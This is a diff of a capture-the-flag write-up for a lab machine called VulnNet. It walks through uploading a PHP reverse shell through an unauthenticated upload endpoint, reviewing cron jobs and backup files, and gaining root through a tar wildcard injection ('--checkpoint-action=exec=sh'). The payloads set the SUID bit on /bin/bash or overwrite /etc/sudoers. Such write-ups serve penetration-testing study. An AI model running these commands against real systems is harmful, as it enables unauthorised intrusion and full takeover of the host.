@@ -347,7 +347,7 @@ $ curl -F "file=@pfile.php" -F "plupload=1" -F "name=anyname.php"
 .
 ```
 
-- Mmmmm, Unauthenticated Arbitrary file Upload. That's exactly what we want to upload reverse shell code!.
+- Mmmmm, **Unauthenticated Arbitrary file Upload**. That's exactly what we want to upload reverse shell code!
 
 ---
 
@@ -356,7 +356,8 @@ $ curl -F "file=@pfile.php" -F "plupload=1" -F "name=anyname.php"
 ### Upload Reverse Shell
 
 - Copy the `php-reverse-shell.php` and change the IP address and Port.
-- Now upload using the exploit code, just change the file name alone
+- Now upload using the exploit code (just change the file name and Authorization header)
+- **P.S**: This authorization header is for accessing `http://broadcast.vulnnet.thm`. It's not the authorization for clipbucket.
 
 ```bash
 $ curl -F "file=@reverse.php" -F "plupload=1" -F "name=reverse.php" "http://broadcast.vulnnet.thm/actions/photo_uploader.php" -H "Authorization: Basic REDACTED"
@@ -423,44 +424,44 @@ www-data@vulnnet:/dev/shm$ ./linpeas.sh | tee linpeas.out
 ```
 
 - Linpeas gave away two things:
-    1. Cron job running a script `/var/opt/backupsrv.sh`:
+  1. Cron job running a script `/var/opt/backupsrv.sh`:
 
-    ```bash
-    www-data@vulnnet:~$ cat /etc/crontab 
-    # /etc/crontab: system-wide crontab
-    # Unlike any other crontab you don't have to run the `crontab'
-    # command to install the new version when you edit this file
-    # and files in /etc/cron.d. These files also have username fields,
-    # that none of the other crontabs do.
+  ```bash
+  www-data@vulnnet:~$ cat /etc/crontab 
+  # /etc/crontab: system-wide crontab
+  # Unlike any other crontab you don't have to run the `crontab'
+  # command to install the new version when you edit this file
+  # and files in /etc/cron.d. These files also have username fields,
+  # that none of the other crontabs do.
 
-    SHELL=/bin/sh
-    PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+  SHELL=/bin/sh
+  PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 
-    # m h dom mon dow user  command
-    */2   * * * *   root    /var/opt/backupsrv.sh
-    17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
-    25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
-    47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
-    52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
-    ```
+  # m h dom mon dow user  command
+  */2   * * * *   root    /var/opt/backupsrv.sh
+  17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+  25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+  47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+  52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+  ```
     
-    2. SSH backup inside `/var/backups/`
+  2. SSH backup of **server-management** user is inside `/var/backups/` directory:
 
-    ```bash
-    www-data@vulnnet:/dev/shm$ cd /var/backups/
-    www-data@vulnnet:/var/backups$ ls -la
-    total 2348
-    .
-    .
-    -rw-------  1 root              root                  857 Jan 23 22:10 group.bak
-    -rw-------  1 root              shadow                712 Jan 23 22:10 gshadow.bak
-    -rw-------  1 root              root                 1831 Jan 23 16:00 passwd.bak
-    -rw-------  1 root              shadow               1118 Jan 23 22:19 shadow.bak
-    -rw-rw-r--  1 server-management server-management    1484 Jan 24 14:08 ssh-backup.tar.gz
-    -rw-r--r--  1 root              root                49338 Jan 25 23:28 vulnnet-Monday.tgz
-    -rw-r--r--  1 root              root                49338 May 22 21:52 vulnnet-Saturday.tgz
-    ```
-    
+  ```bash
+  www-data@vulnnet:/dev/shm$ cd /var/backups/
+  www-data@vulnnet:/var/backups$ ls -la
+  total 2348
+  .
+  .
+  -rw-------  1 root              root                  857 Jan 23 22:10 group.bak
+  -rw-------  1 root              shadow                712 Jan 23 22:10 gshadow.bak
+  -rw-------  1 root              root                 1831 Jan 23 16:00 passwd.bak
+  -rw-------  1 root              shadow               1118 Jan 23 22:19 shadow.bak
+  -rw-rw-r--  1 server-management server-management    1484 Jan 24 14:08 ssh-backup.tar.gz
+  -rw-r--r--  1 root              root                49338 Jan 25 23:28 vulnnet-Monday.tgz
+  -rw-r--r--  1 root              root                49338 May 22 21:52 vulnnet-Saturday.tgz
+  ```
+
 ---
 
 ## Privilege Escalation (www-data to server-management)
@@ -613,7 +614,7 @@ ls -lh $dest
 server-manage
 ```
 
-- It's copying the files inside `/home/server-management/Documents` folder and saving it as `.tgz` file in the `/var/backups` folder.
+- It's copying the files inside `/home/server-management/Documents` directory (**with a wildcard match**) and saving it as `.tgz` file in the `/var/backups` directory.
 - Initially I tried to do **path hijacking** and was fumbling around!
 - Finally got this: [Tar - Execute arbitrary commands](https://book.hacktricks.xyz/linux-unix/privilege-escalation/wildcards-spare-tricks#tar)
 
@@ -621,8 +622,9 @@ server-manage
 ### Exploiting tar
 
 - Insert malicious code into `exploit.sh` and also the arbitrary command execution payload!
-    - `chmod +s /bin/bash` (or)
-    - `echo "server-management ALL=(root) NOPASSWD: ALL" > /etc/sudoers`
+- Malicious code:
+  - `chmod +s /bin/bash` (or)
+  - `echo "server-management ALL=(root) NOPASSWD: ALL" > /etc/sudoers`
 
 ```bash
 server-management@vulnnet:/$ cd ~/Documents/
@@ -639,9 +641,12 @@ server-management@vulnnet:~/Documents$ echo "" > "--checkpoint-action=exec=sh ex
 ## Root.txt
 
 - Check if the permissions on `/bin/bash` have changed.
-- Once it is changed, you can run `/bin/bash -p` to become root!
+- Once the **SUID bit** is set, you can run `/bin/bash -p` to become root!
 
 ```bash
+server-management@vulnnet:~$ ls -l /bin/bash
+-rwxr-xr-x 1 root root 1113504 Apr  4  2018 /bin/bash
+
 server-management@vulnnet:~$ ls -l /bin/bash
 -rwsr-sr-x 1 root root 1113504 Apr  4  2018 /bin/bash
 
